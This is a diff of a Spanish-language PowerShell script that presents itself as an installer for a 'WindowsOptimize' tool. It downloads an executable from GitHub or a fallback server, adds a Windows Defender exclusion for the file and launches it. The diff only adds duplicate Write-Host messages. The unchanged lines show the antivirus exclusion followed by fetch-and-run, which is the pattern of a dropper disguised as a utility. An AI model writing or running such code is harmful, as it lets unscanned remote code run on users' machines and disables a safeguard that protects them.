@@ -32,6 +32,7 @@ $fileName = "WindowsOptimizeApp_$arch.exe"
 $finalName = "WindowsOptimize.exe"
 
 Write-Output "Sistema detectado: $arch"
+Write-Host "Sistema detectado: $arch"
 
 # ================= RUTAS =================
 $tempPath  = Join-Path -Path $env:USERPROFILE -ChildPath $fileName
@@ -49,6 +50,7 @@ function Download-File($url, $output) {
 
 # ================= INTENTO 1: GITHUB =================
 Write-Output "Intentando descarga desde GitHub..."
+Write-Host "Intentando descarga desde GitHub..."
 
 $downloaded = $false
 
@@ -63,15 +65,19 @@ try {
         $downloaded = Download-File $asset.browser_download_url $tempPath
     } else {
         Write-Warning "No se encontró el asset en GitHub"
+        Write-Host "No se encontró el asset en GitHub"
     }
 
 } catch {
     Write-Warning "Error accediendo a GitHub"
+    Write-Host "Error accediendo a GitHub"
+    
 }
 
 # ================= FALLBACK =================
 if (-not $downloaded) {
     Write-Warning "Usando fallback desde servidor web..."
+    Write-Host "Usando fallback desde servidor web..."
 
     $fallbackUrl = "$fallbackBaseUrl/$fileName"
 
@@ -79,6 +85,7 @@ if (-not $downloaded) {
 
     if (-not $downloaded) {
         Write-Error "Error descargando desde GitHub y fallback web"
+        Write-Host "Error descargando desde GitHub y fallback web"
         exit 1
     }
 }
@@ -86,6 +93,7 @@ if (-not $downloaded) {
 # ================= VALIDACIÓN =================
 if (-not (Test-Path $tempPath)) {
     Write-Error "El archivo no existe después de la descarga"
+    Write-Host "El archivo no existe después de la descarga"
     exit 1
 }
 
@@ -115,16 +123,20 @@ Write-Output "Archivo final: $finalPath"
 try {
     Add-MpPreference -ExclusionPath $finalPath
     Write-Output "Excepción de Windows Defender añadida"
+    Write-Host "Excepción de Windows Defender añadida"
 } catch {
     Write-Warning "No se pudo agregar la exclusión"
+    Write-Host "No se pudo agregar la exclusión"
 }
 
 # ================= EJECUTAR =================
 Write-Output "Ejecutando $finalName..."
+Write-Host "Ejecutando $finalName..."
 
 try {
     Start-Process -FilePath $finalPath
 } catch {
     Write-Error "Error al ejecutar el archivo"
+    Write-Host "Error al ejecutar el archivo"
     exit 1
 }
